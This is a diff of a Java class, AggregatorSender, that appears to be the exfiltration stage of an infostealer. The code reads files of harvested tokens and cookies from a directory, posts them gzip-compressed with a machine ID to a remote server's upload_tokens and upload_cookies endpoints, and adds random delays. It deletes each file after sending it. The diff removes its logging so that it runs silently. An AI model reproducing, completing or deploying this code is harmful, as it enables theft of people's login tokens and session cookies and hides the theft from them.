@@ -14,34 +14,25 @@ public class AggregatorSender {
     
     public static void main(String[] args) {
         scheduler.scheduleAtFixedRate(() -> {
-            try {
-                processAndSend();
-            } catch (Exception e) {}
-        }, 10, 60, TimeUnit.SECONDS); // каждую минуту, без нагрузки
+            try { processAndSend(); } catch (Exception e) {}
+        }, 10, 60, TimeUnit.SECONDS);
     }
     
     private static void processAndSend() {
         File extractedDir = new File(EXTRACTED_DIR);
         if (!extractedDir.exists()) return;
-        
         File[] files = extractedDir.listFiles();
         if (files == null) return;
         
         for (File f : files) {
             String hash = getFileHash(f);
             if (sentHashes.contains(hash)) continue;
-            
             try {
                 String content = new String(Files.readAllBytes(f.toPath()));
                 if (content.trim().isEmpty()) continue;
-                
-                // Отправляем без нагрузки: задержка, малый размер пакетов
                 Thread.sleep(200 + (int)(Math.random() * 300));
                 sendData(f.getName(), content);
-                
                 sentHashes.add(hash);
-                
-                // Удаляем отправленный файл, чтобы не накапливать
                 f.delete();
             } catch (Exception e) {}
         }
@@ -50,37 +41,20 @@ public class AggregatorSender {
     private static void sendData(String filename, String data) {
         HttpURLConnection conn = null;
         try {
-            String urlStr;
-            if (filename.contains("tokens")) {
-                urlStr = SERVER_URL + "/upload_tokens";
-            } else {
-                urlStr = SERVER_URL + "/upload_cookies";
-            }
-            
+            String urlStr = filename.contains("tokens") ? SERVER_URL + "/upload_tokens" : SERVER_URL + "/upload_cookies";
             String payload = "HWID: " + HWID + "\nFILE: " + filename + "\n" + data;
-            
             URL url = new URL(urlStr);
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setConnectTimeout(5000);
-            conn.setReadTimeout(10000);
-            
-            // Сжатие для уменьшения нагрузки
             byte[] compressed = compress(payload);
             conn.setRequestProperty("Content-Encoding", "gzip");
             conn.getOutputStream().write(compressed);
             conn.getOutputStream().close();
-            
-            int code = conn.getResponseCode();
-            if (code == 200) {
-                System.out.println("[Aggregator] Sent: " + filename);
-            }
-        } catch (Exception e) {
-            // Молчание — без логов, не нагружать
-        } finally {
-            if (conn != null) conn.disconnect();
-        }
+            conn.getResponseCode();
+        } catch (Exception e) {}
+        finally { if (conn != null) conn.disconnect(); }
     }
     
     private static byte[] compress(String str) throws IOException {
